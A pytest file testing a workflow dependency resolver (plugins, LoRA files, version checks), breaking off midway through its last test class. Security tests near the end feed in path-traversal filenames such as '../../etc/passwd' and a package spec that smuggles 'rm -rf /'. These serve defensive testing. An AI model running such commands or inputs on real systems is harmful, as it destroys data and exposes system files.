"""Tests for workflow dependency resolution."""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest

from scope.core.workflows.resolve import (
    WorkflowLoRA,
    WorkflowLoRAProvenance,
    WorkflowPipeline,
    WorkflowPipelineSource,
    WorkflowRequest,
    resolve_workflow,
)

# ---------------------------------------------------------------------------
# Test helpers
# ---------------------------------------------------------------------------


def make_workflow(**overrides) -> WorkflowRequest:
    """Build a minimal valid WorkflowRequest for tests."""
    defaults = {
        "pipelines": [
            WorkflowPipeline(
                pipeline_id="test_pipe",
                source=WorkflowPipelineSource(type="builtin"),
            )
        ],
    }
    defaults.update(overrides)
    return WorkflowRequest(**defaults)


def mock_plugin_manager(plugins: list[dict] | None = None) -> MagicMock:
    pm = MagicMock()
    pm.list_plugins_sync.return_value = plugins or []
    return pm


# ---------------------------------------------------------------------------
# resolve_workflow tests
# ---------------------------------------------------------------------------


class TestResolveBuiltinPipeline:
    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_all_ok(self, mock_registry, tmp_path):
        mock_registry.is_registered.return_value = True

        wf = make_workflow()
        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)

        assert plan.can_apply is True
        pipeline_items = [i for i in plan.items if i.kind == "pipeline"]
        assert len(pipeline_items) == 1
        assert pipeline_items[0].status == "ok"

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_missing_builtin(self, mock_registry, tmp_path):
        mock_registry.is_registered.return_value = False

        wf = make_workflow()
        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)

        assert plan.can_apply is False
        pipeline_items = [i for i in plan.items if i.kind == "pipeline"]
        assert pipeline_items[0].status == "missing"


class TestResolvePlugin:
    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_missing_plugin_auto_resolvable(self, mock_registry, tmp_path):
        mock_registry.is_registered.return_value = False

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="face-swap",
                    source=WorkflowPipelineSource(
                        type="pypi",
                        plugin_name="scope-deeplivecam",
                        plugin_version="0.1.0",
                    ),
                )
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)

        assert plan.can_apply is False
        plugin_items = [i for i in plan.items if i.kind == "plugin"]
        assert len(plugin_items) == 1
        assert plugin_items[0].status == "missing"
        assert plugin_items[0].can_auto_resolve is True
        assert "scope-deeplivecam" in plugin_items[0].action

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_plugin_installed_ok(self, mock_registry, tmp_path):
        mock_registry.is_registered.return_value = True

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="face-swap",
                    source=WorkflowPipelineSource(
                        type="pypi",
                        plugin_name="scope-deeplivecam",
                        plugin_version="0.1.0",
                    ),
                )
            ]
        )
        pm = mock_plugin_manager([{"name": "scope-deeplivecam", "version": "0.2.0"}])

        plan = resolve_workflow(wf, pm, tmp_path)

        assert plan.can_apply is True
        plugin_items = [i for i in plan.items if i.kind == "plugin"]
        assert plugin_items[0].status == "ok"

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_plugin_version_mismatch(self, mock_registry, tmp_path):
        mock_registry.is_registered.return_value = True

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="face-swap",
                    source=WorkflowPipelineSource(
                        type="pypi",
                        plugin_name="scope-deeplivecam",
                        plugin_version="2.0.0",
                    ),
                )
            ]
        )
        pm = mock_plugin_manager([{"name": "scope-deeplivecam", "version": "0.1.0"}])

        plan = resolve_workflow(wf, pm, tmp_path)

        plugin_items = [i for i in plan.items if i.kind == "plugin"]
        assert plugin_items[0].status == "version_mismatch"
        assert plugin_items[0].can_auto_resolve is True


class TestResolveLoRA:
    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_lora_present(self, mock_registry, tmp_path):
        mock_registry.is_registered.return_value = True

        lora_dir = tmp_path / "lora"
        lora_dir.mkdir()
        (lora_dir / "test.safetensors").write_bytes(b"fake")

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="test_pipe",
                    source=WorkflowPipelineSource(type="builtin"),
                    loras=[WorkflowLoRA(filename="test.safetensors")],
                )
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
        lora_items = [i for i in plan.items if i.kind == "lora"]
        assert lora_items[0].status == "ok"

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_lora_missing_no_provenance(self, mock_registry, tmp_path):
        mock_registry.is_registered.return_value = True

        (tmp_path / "lora").mkdir()

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="test_pipe",
                    source=WorkflowPipelineSource(type="builtin"),
                    loras=[WorkflowLoRA(filename="missing.safetensors")],
                )
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)

        assert plan.can_apply is True  # missing LoRAs don't block
        lora_items = [i for i in plan.items if i.kind == "lora"]
        assert lora_items[0].status == "missing"
        assert lora_items[0].can_auto_resolve is False

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_lora_missing_with_provenance(self, mock_registry, tmp_path):
        mock_registry.is_registered.return_value = True

        (tmp_path / "lora").mkdir()

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="test_pipe",
                    source=WorkflowPipelineSource(type="builtin"),
                    loras=[
                        WorkflowLoRA(
                            filename="arcane.safetensors",
                            provenance=WorkflowLoRAProvenance(
                                source="huggingface",
                                repo_id="user/arcane-lora",
                            ),
                        )
                    ],
                )
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)

        lora_items = [i for i in plan.items if i.kind == "lora"]
        assert lora_items[0].status == "missing"
        assert lora_items[0].can_auto_resolve is True
        assert "HuggingFace" in lora_items[0].action


# ---------------------------------------------------------------------------
# Plugin resolution edge cases
# ---------------------------------------------------------------------------


class TestResolvePluginEdgeCases:
    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_plugin_name_none(self, mock_registry, tmp_path):
        """Non-builtin pipeline with no plugin_name is marked missing."""
        mock_registry.is_registered.return_value = False

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="unknown-pipe",
                    source=WorkflowPipelineSource(type="pypi"),
                )
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)

        assert plan.can_apply is False
        plugin_items = [i for i in plan.items if i.kind == "plugin"]
        assert len(plugin_items) == 1
        assert plugin_items[0].status == "missing"
        assert "No plugin name" in plugin_items[0].detail

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_missing_plugin_git_source(self, mock_registry, tmp_path):
        """Missing plugin with git source shows git install action."""
        mock_registry.is_registered.return_value = False

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="face-swap",
                    source=WorkflowPipelineSource(
                        type="git",
                        plugin_name="scope-deeplivecam",
                        package_spec="git+https://github.com/example/scope-deeplivecam.git",
                    ),
                )
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)

        plugin_items = [i for i in plan.items if i.kind == "plugin"]
        assert plugin_items[0].status == "missing"
        assert "Install from git:" in plugin_items[0].action
        assert "github.com" in plugin_items[0].action

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_invalid_version_treated_as_ok(self, mock_registry, tmp_path):
        """Unparseable version strings don't block; treated as ok with detail."""
        mock_registry.is_registered.return_value = True

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="face-swap",
                    source=WorkflowPipelineSource(
                        type="pypi",
                        plugin_name="scope-deeplivecam",
                        plugin_version="1.0.0",
                    ),
                )
            ]
        )
        pm = mock_plugin_manager(
            [{"name": "scope-deeplivecam", "version": "not-a-version"}]
        )

        plan = resolve_workflow(wf, pm, tmp_path)

        plugin_items = [i for i in plan.items if i.kind == "plugin"]
        assert plugin_items[0].status == "ok"
        assert "Could not compare versions" in plugin_items[0].detail

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_plugin_no_version_info(self, mock_registry, tmp_path):
        """Plugin installed with no version on either side is ok."""
        mock_registry.is_registered.return_value = True

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="face-swap",
                    source=WorkflowPipelineSource(
                        type="pypi",
                        plugin_name="scope-deeplivecam",
                    ),
                )
            ]
        )
        pm = mock_plugin_manager([{"name": "scope-deeplivecam"}])

        plan = resolve_workflow(wf, pm, tmp_path)

        assert plan.can_apply is True
        plugin_items = [i for i in plan.items if i.kind == "plugin"]
        assert plugin_items[0].status == "ok"
        assert plugin_items[0].detail is None


# ---------------------------------------------------------------------------
# LoRA provenance edge cases
# ---------------------------------------------------------------------------


class TestResolveLoRAProvenance:
    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_missing_lora_civitai_provenance(self, mock_registry, tmp_path):
        """CivitAI provenance generates correct action string."""
        mock_registry.is_registered.return_value = True

        (tmp_path / "lora").mkdir()

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="test_pipe",
                    source=WorkflowPipelineSource(type="builtin"),
                    loras=[
                        WorkflowLoRA(
                            filename="style.safetensors",
                            provenance=WorkflowLoRAProvenance(
                                source="civitai",
                                model_id="12345",
                            ),
                        )
                    ],
                )
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)

        lora_items = [i for i in plan.items if i.kind == "lora"]
        assert lora_items[0].status == "missing"
        assert lora_items[0].can_auto_resolve is True
        assert "CivitAI" in lora_items[0].action
        assert "12345" in lora_items[0].action

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_missing_lora_url_provenance_with_url(self, mock_registry, tmp_path):
        """URL provenance with a url field uses that URL in the action."""
        mock_registry.is_registered.return_value = True

        (tmp_path / "lora").mkdir()

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="test_pipe",
                    source=WorkflowPipelineSource(type="builtin"),
                    loras=[
                        WorkflowLoRA(
                            filename="custom.safetensors",
                            provenance=WorkflowLoRAProvenance(
                                source="url",
                                url="https://example.com/lora.safetensors",
                            ),
                        )
                    ],
                )
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)

        lora_items = [i for i in plan.items if i.kind == "lora"]
        assert lora_items[0].can_auto_resolve is True
        assert "example.com" in lora_items[0].action

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_missing_lora_url_provenance_without_url(self, mock_registry, tmp_path):
        """URL provenance without a url field falls back to generic action."""
        mock_registry.is_registered.return_value = True

        (tmp_path / "lora").mkdir()

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="test_pipe",
                    source=WorkflowPipelineSource(type="builtin"),
                    loras=[
                        WorkflowLoRA(
                            filename="custom.safetensors",
                            provenance=WorkflowLoRAProvenance(source="url"),
                        )
                    ],
                )
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)

        lora_items = [i for i in plan.items if i.kind == "lora"]
        assert lora_items[0].can_auto_resolve is True
        assert lora_items[0].action == "Download from source"

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_missing_lora_local_provenance_not_auto_resolvable(
        self, mock_registry, tmp_path
    ):
        """Local provenance is treated as no provenance (not auto-resolvable)."""
        mock_registry.is_registered.return_value = True

        (tmp_path / "lora").mkdir()

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="test_pipe",
                    source=WorkflowPipelineSource(type="builtin"),
                    loras=[
                        WorkflowLoRA(
                            filename="local.safetensors",
                            provenance=WorkflowLoRAProvenance(source="local"),
                        )
                    ],
                )
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)

        lora_items = [i for i in plan.items if i.kind == "lora"]
        assert lora_items[0].status == "missing"
        assert lora_items[0].can_auto_resolve is False
        assert lora_items[0].action is None


# ---------------------------------------------------------------------------
# Multi-pipeline resolve
# ---------------------------------------------------------------------------


class TestResolveMultiplePipelines:
    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_mixed_builtin_ok_and_plugin_missing(self, mock_registry, tmp_path):
        """One ok builtin + one missing plugin: can_apply is False, both items present."""
        mock_registry.is_registered.side_effect = lambda pid: pid == "test_pipe"

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="test_pipe",
                    source=WorkflowPipelineSource(type="builtin"),
                ),
                WorkflowPipeline(
                    pipeline_id="face-swap",
                    source=WorkflowPipelineSource(
                        type="pypi",
                        plugin_name="scope-deeplivecam",
                    ),
                ),
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)

        assert plan.can_apply is False
        pipeline_items = [i for i in plan.items if i.kind == "pipeline"]
        plugin_items = [i for i in plan.items if i.kind == "plugin"]
        assert len(pipeline_items) == 1
        assert pipeline_items[0].status == "ok"
        assert len(plugin_items) == 1
        assert plugin_items[0].status == "missing"

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_multiple_pipelines_all_ok(self, mock_registry, tmp_path):
        """Multiple builtin pipelines all registered: can_apply is True."""
        mock_registry.is_registered.return_value = True

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="pipe_a",
                    source=WorkflowPipelineSource(type="builtin"),
                ),
                WorkflowPipeline(
                    pipeline_id="pipe_b",
                    source=WorkflowPipelineSource(type="builtin"),
                ),
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)

        assert plan.can_apply is True
        pipeline_items = [i for i in plan.items if i.kind == "pipeline"]
        assert len(pipeline_items) == 2
        assert all(i.status == "ok" for i in pipeline_items)


# ---------------------------------------------------------------------------
# Extra fields ignored (forward compatibility)
# ---------------------------------------------------------------------------


class TestExtraFieldsIgnored:
    """WorkflowRequest uses extra='ignore' so the frontend can send the
    full workflow JSON (with metadata, timeline, etc.) and the backend
    silently drops fields it doesn't need."""

    def test_full_workflow_json_accepted(self):
        """A complete .scope-workflow.json document parses into WorkflowRequest."""
        data = {
            "format": "scope-workflow",
            "format_version": "1.0",
            "metadata": {
                "name": "compat test",
                "created_at": "2025-01-01T00:00:00Z",
                "scope_version": "0.1.0",
            },
            "pipelines": [
                {
                    "pipeline_id": "longlive",
                    "pipeline_version": "1.0.0",
                    "source": {"type": "builtin"},
                    "loras": [
                        {
                            "filename": "my.safetensors",
                            "weight": 0.8,
                            "provenance": {
                                "source": "huggingface",
                                "repo_id": "user/repo",
                            },
                            "sha256": "deadbeef",
                        }
                    ],
                    "params": {"height": 480},
                }
            ],
            "timeline": {"entries": [{"start_time": 0, "end_time": 10, "prompts": []}]},
            "min_scope_version": "0.5.0",
        }
        wf = WorkflowRequest.model_validate(data)
        assert wf.pipelines[0].pipeline_id == "longlive"
        assert wf.min_scope_version == "0.5.0"

    def test_unknown_top_level_fields_ignored(self):
        data = {
            "pipelines": [{"pipeline_id": "p", "source": {"type": "builtin"}}],
            "future_field": "should be dropped",
        }
        wf = WorkflowRequest.model_validate(data)
        assert wf.pipelines[0].pipeline_id == "p"
        assert not hasattr(wf, "future_field")


# ---------------------------------------------------------------------------
# min_scope_version tests (moved from test_workflow_timeline.py)
# ---------------------------------------------------------------------------


class TestMinScopeVersion:
    """WorkflowRequest.min_scope_version field."""

    def test_default_is_none(self):
        wf = make_workflow()
        assert wf.min_scope_version is None

    def test_round_trip(self):
        wf = make_workflow(min_scope_version="0.5.0")
        data = wf.model_dump()
        restored = WorkflowRequest.model_validate(data)
        assert restored.min_scope_version == "0.5.0"

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_resolve_warns_when_current_is_older(self, mock_registry, tmp_path):
        """min_scope_version check produces a warning on resolve."""
        mock_registry.is_registered.return_value = True

        wf = make_workflow(min_scope_version="99.0.0")
        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)

        assert any("99.0.0" in w for w in plan.warnings)

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_resolve_no_warning_when_version_ok(self, mock_registry, tmp_path):
        mock_registry.is_registered.return_value = True

        wf = make_workflow(min_scope_version="0.0.1")
        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)

        assert not any("Scope >=" in w for w in plan.warnings)

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    @patch("importlib.metadata.version")
    def test_resolve_warns_when_package_not_found(
        self, mock_version, mock_registry, tmp_path
    ):
        """PackageNotFoundError produces a warning."""
        import importlib.metadata

        mock_registry.is_registered.return_value = True
        mock_version.side_effect = importlib.metadata.PackageNotFoundError(
            "daydream-scope"
        )

        wf = make_workflow(min_scope_version="1.0.0")
        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)

        assert any("Could not verify" in w for w in plan.warnings)


# ---------------------------------------------------------------------------
# Path traversal tests
# ---------------------------------------------------------------------------


class TestPathTraversal:
    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_lora_path_traversal_rejected(self, mock_registry, tmp_path):
        """LoRA filenames with path traversal components are rejected."""
        mock_registry.is_registered.return_value = True

        lora_dir = tmp_path / "lora"
        lora_dir.mkdir()

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="test_pipe",
                    source=WorkflowPipelineSource(type="builtin"),
                    loras=[WorkflowLoRA(filename="../../etc/passwd")],
                )
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)

        lora_items = [i for i in plan.items if i.kind == "lora"]
        assert lora_items[0].status == "missing"
        assert lora_items[0].detail == "Invalid LoRA filename"
        assert lora_items[0].can_auto_resolve is False

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_lora_normal_filename_ok(self, mock_registry, tmp_path):
        """Normal filenames still work after path traversal guard."""
        mock_registry.is_registered.return_value = True

        lora_dir = tmp_path / "lora"
        lora_dir.mkdir()
        (lora_dir / "valid.safetensors").write_bytes(b"data")

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="test_pipe",
                    source=WorkflowPipelineSource(type="builtin"),
                    loras=[WorkflowLoRA(filename="valid.safetensors")],
                )
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)

        lora_items = [i for i in plan.items if i.kind == "lora"]
        assert lora_items[0].status == "ok"


# ---------------------------------------------------------------------------
# Empty pipelines + version_mismatch can_apply tests
# ---------------------------------------------------------------------------


class TestEdgeCases:
    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_empty_pipelines(self, mock_registry, tmp_path):
        """Empty pipelines list resolves with can_apply=True and no items."""
        wf = WorkflowRequest(pipelines=[])
        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)

        assert plan.can_apply is True
        assert plan.items == []

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_version_mismatch_blocks_can_apply(self, mock_registry, tmp_path):
        """Plugin version_mismatch sets can_apply=False."""
        mock_registry.is_registered.return_value = True

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="face-swap",
                    source=WorkflowPipelineSource(
                        type="pypi",
                        plugin_name="scope-deeplivecam",
                        plugin_version="2.0.0",
                    ),
                )
            ]
        )
        pm = mock_plugin_manager([{"name": "scope-deeplivecam", "version": "0.1.0"}])

        plan = resolve_workflow(wf, pm, tmp_path)

        plugin_items = [i for i in plan.items if i.kind == "plugin"]
        assert plugin_items[0].status == "version_mismatch"
        assert plan.can_apply is False


# ---------------------------------------------------------------------------
# Input validation (Field constraints)
# ---------------------------------------------------------------------------


class TestInputValidation:
    def test_lora_filename_max_length(self):
        """LoRA filename exceeding max_length is rejected."""
        from pydantic import ValidationError

        with pytest.raises(ValidationError):
            WorkflowLoRA(filename="a" * 256)

    def test_lora_filename_at_max_length(self):
        """LoRA filename at max_length is accepted."""
        lora = WorkflowLoRA(filename="a" * 255)
        assert len(lora.filename) == 255

    def test_too_many_pipelines_rejected(self):
        """WorkflowRequest with >50 pipelines is rejected."""
        from pydantic import ValidationError

        pipelines = [
            WorkflowPipeline(
                pipeline_id=f"pipe_{i}",
                source=WorkflowPipelineSource(type="builtin"),
            )
            for i in range(51)
        ]
        with pytest.raises(ValidationError):
            WorkflowRequest(pipelines=pipelines)

    def test_too_many_loras_rejected(self):
        """WorkflowPipeline with >100 LoRAs is rejected."""
        from pydantic import ValidationError

        loras = [WorkflowLoRA(filename=f"lora_{i}.safetensors") for i in range(101)]
        with pytest.raises(ValidationError):
            WorkflowPipeline(
                pipeline_id="test",
                source=WorkflowPipelineSource(type="builtin"),
                loras=loras,
            )


# ---------------------------------------------------------------------------
# Adversarial / bug-hunting tests
# ---------------------------------------------------------------------------


class TestPluginManagerFailures:
    """What happens when the plugin manager itself breaks?"""

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_plugin_manager_throws_degrades_gracefully(self, mock_registry, tmp_path):
        """list_plugins_sync() crash is caught; plugins treated as missing."""
        mock_registry.is_registered.return_value = True
        pm = MagicMock()
        pm.list_plugins_sync.side_effect = RuntimeError("metadata corrupted")

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="test",
                    source=WorkflowPipelineSource(
                        type="pypi", plugin_name="some-plugin"
                    ),
                )
            ]
        )

        plan = resolve_workflow(wf, pm, tmp_path)
        assert plan.can_apply is False
        assert any("Could not read installed plugins" in w for w in plan.warnings)
        plugin_items = [i for i in plan.items if i.kind == "plugin"]
        assert plugin_items[0].status == "missing"


class TestVersionComparisonGaps:
    """Edge cases in version comparison logic."""

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_workflow_requires_version_but_installed_has_none(
        self, mock_registry, tmp_path
    ):
        """Plugin installed without version metadata, workflow requires >=2.0.

        Returns status="ok" (non-blocking) but includes a detail warning
        so the user knows version could not be verified.
        """
        mock_registry.is_registered.return_value = True
        pm = mock_plugin_manager([{"name": "scope-stylize"}])  # no version key

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="stylize",
                    source=WorkflowPipelineSource(
                        type="pypi",
                        plugin_name="scope-stylize",
                        plugin_version="2.0.0",
                    ),
                )
            ]
        )

        plan = resolve_workflow(wf, pm, tmp_path)
        plugin_items = [i for i in plan.items if i.kind == "plugin"]

        assert plugin_items[0].status == "ok"
        assert "Could not verify version" in plugin_items[0].detail

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_same_plugin_conflicting_versions_across_pipelines(
        self, mock_registry, tmp_path
    ):
        """Two pipelines require same plugin at different versions.

        Installed 1.5.0: pipeline A (>=1.0) ok, pipeline B (>=2.0) mismatch.
        Same plugin appears in the plan with contradictory statuses.

        Known limitation: no dedup or conflict detection. The UI shows both
        items and can_apply=False if any mismatch, which is acceptable.
        """
        mock_registry.is_registered.return_value = True
        pm = mock_plugin_manager([{"name": "scope-fx", "version": "1.5.0"}])

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="fx-v1",
                    source=WorkflowPipelineSource(
                        type="pypi",
                        plugin_name="scope-fx",
                        plugin_version="1.0.0",
                    ),
                ),
                WorkflowPipeline(
                    pipeline_id="fx-v2",
                    source=WorkflowPipelineSource(
                        type="pypi",
                        plugin_name="scope-fx",
                        plugin_version="2.0.0",
                    ),
                ),
            ]
        )

        plan = resolve_workflow(wf, pm, tmp_path)
        plugin_items = [i for i in plan.items if i.kind == "plugin"]

        # Same plugin, contradictory statuses
        assert len(plugin_items) == 2
        assert plugin_items[0].status == "ok"
        assert plugin_items[1].status == "version_mismatch"
        assert plan.can_apply is False


class TestDegenerateInputs:
    """Empty strings, missing fields, weird shapes."""

    def test_empty_pipeline_id_rejected(self):
        """Empty string pipeline_id is rejected by Pydantic validation."""
        from pydantic import ValidationError

        with pytest.raises(ValidationError):
            WorkflowPipeline(
                pipeline_id="",
                source=WorkflowPipelineSource(type="builtin"),
            )

    def test_empty_plugin_name_rejected(self):
        """Empty string plugin_name is rejected by Pydantic validation."""
        from pydantic import ValidationError

        with pytest.raises(ValidationError):
            WorkflowPipelineSource(type="pypi", plugin_name="")

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_duplicate_loras_same_pipeline(self, mock_registry, tmp_path):
        """Same LoRA listed twice: produces duplicate items, no dedup."""
        mock_registry.is_registered.return_value = True
        lora_dir = tmp_path / "lora"
        lora_dir.mkdir()
        (lora_dir / "style.safetensors").write_bytes(b"data")

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="test_pipe",
                    source=WorkflowPipelineSource(type="builtin"),
                    loras=[
                        WorkflowLoRA(filename="style.safetensors"),
                        WorkflowLoRA(filename="style.safetensors"),
                    ],
                )
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
        lora_items = [i for i in plan.items if i.kind == "lora"]
        assert len(lora_items) == 2  # no dedup

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_plugin_dict_missing_name_key(self, mock_registry, tmp_path):
        """Plugin dict without 'name' key: silently skipped, plugin marked missing."""
        mock_registry.is_registered.return_value = True
        pm = mock_plugin_manager([{"version": "1.0.0"}])

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="test",
                    source=WorkflowPipelineSource(type="pypi", plugin_name="scope-fx"),
                )
            ]
        )

        plan = resolve_workflow(wf, pm, tmp_path)
        plugin_items = [i for i in plan.items if i.kind == "plugin"]
        assert plugin_items[0].status == "missing"

    def test_invalid_source_type_rejected(self):
        """Pydantic Literal rejects unknown source types."""
        from pydantic import ValidationError

        with pytest.raises(ValidationError):
            WorkflowPipelineSource(type="docker")


class TestSymlinkAndPathEdgeCases:
    """Path traversal, symlinks, and filesystem edge cases."""

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_symlink_inside_lora_dir_pointing_outside(self, mock_registry, tmp_path):
        """Symlink in lora_dir -> file outside. resolve() follows it,
        so the resolved path is outside lora_dir. Should be rejected.
        """
        mock_registry.is_registered.return_value = True

        lora_dir = tmp_path / "lora"
        lora_dir.mkdir()
        secret = tmp_path / "secret.txt"
        secret.write_text("sensitive data")

        symlink = lora_dir / "sneaky.safetensors"
        try:
            symlink.symlink_to(secret)
        except OSError:
            pytest.skip("Cannot create symlinks (requires admin on Windows)")

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="test_pipe",
                    source=WorkflowPipelineSource(type="builtin"),
                    loras=[WorkflowLoRA(filename="sneaky.safetensors")],
                )
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
        lora_items = [i for i in plan.items if i.kind == "lora"]
        # Symlink resolves outside lora_dir, should be caught
        assert lora_items[0].status == "missing"
        assert lora_items[0].detail == "Invalid LoRA filename"

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_absolute_path_in_lora_filename(self, mock_registry, tmp_path):
        """Absolute path should not resolve to within lora_dir."""
        mock_registry.is_registered.return_value = True
        (tmp_path / "lora").mkdir()

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="test_pipe",
                    source=WorkflowPipelineSource(type="builtin"),
                    loras=[WorkflowLoRA(filename="/etc/passwd")],
                )
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
        lora_items = [i for i in plan.items if i.kind == "lora"]
        assert lora_items[0].status == "missing"
        assert lora_items[0].detail == "Invalid LoRA filename"

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_lora_filename_with_null_byte(self, mock_registry, tmp_path):
        """Null byte in filename: should not crash."""
        mock_registry.is_registered.return_value = True
        (tmp_path / "lora").mkdir()

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="test_pipe",
                    source=WorkflowPipelineSource(type="builtin"),
                    loras=[WorkflowLoRA(filename="evil\x00.safetensors")],
                )
            ]
        )

        # Should either reject or handle gracefully
        try:
            plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
            lora_items = [i for i in plan.items if i.kind == "lora"]
            assert lora_items[0].status == "missing"
        except (ValueError, OSError):
            pass  # acceptable to raise on null bytes

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_lora_dir_does_not_exist(self, mock_registry, tmp_path):
        """models_dir/lora doesn't exist: shouldn't crash."""
        mock_registry.is_registered.return_value = True

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="test_pipe",
                    source=WorkflowPipelineSource(type="builtin"),
                    loras=[WorkflowLoRA(filename="test.safetensors")],
                )
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
        lora_items = [i for i in plan.items if i.kind == "lora"]
        assert lora_items[0].status == "missing"


class TestPackageSpecInjection:
    """Untrusted package_spec values flow through to action strings and pip.

    Known limitation: package_spec is not validated at the resolution layer.
    The trust-gate UI shows the raw spec to the user before any install occurs,
    and subprocess uses list args (no shell injection). The risk is limited to
    social engineering via misleading display strings.
    """

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_shell_metacharacters_in_package_spec(self, mock_registry, tmp_path):
        """package_spec with shell metacharacters passes through to action string."""
        mock_registry.is_registered.return_value = False

        wf = make_workflow(
            pipelines=[
                WorkflowPipeline(
                    pipeline_id="evil",
                    source=WorkflowPipelineSource(
                        type="git",
                        plugin_name="legit-plugin",
                        package_spec="legit-plugin; rm -rf /",
                    ),
                )
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
        plugin_items = [i for i in plan.items if i.kind == "plugin"]
        # Payload is in the action string that gets shown in UI and passed to pip
        assert "rm -rf" in plugin_items[0].action

    @patch("scope.core.pipelines.registry.PipelineRegistry")
    def test_package_spec_with_pip_install_flags(self, mock_registry, tmp_path):
        """package_spec with pip flags passes through to action string."""
        mock_registry.is_registered.return_value = False

        wf = make_workflow(
            pipelines=[
